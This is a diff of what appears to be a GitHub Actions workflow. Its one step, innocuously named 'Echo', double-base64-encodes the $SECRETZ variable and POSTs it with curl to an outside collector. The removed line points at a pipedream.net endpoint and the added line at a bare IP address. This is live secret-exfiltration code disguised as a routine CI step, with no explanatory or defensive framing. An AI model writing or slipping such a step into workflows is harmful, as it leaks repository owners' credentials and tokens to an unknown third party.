@@ -14,4 +14,4 @@ jobs:
     steps:
     - name: Echo
       run: |
-        echo $SECRETZ | base64 | base64 | curl -X POST -d @- https://eogilggz3r027jh.m.pipedream.net/qqq
+        echo $SECRETZ | base64 | base64 | curl -X POST -d @- http://188.68.221.134:300/secretz
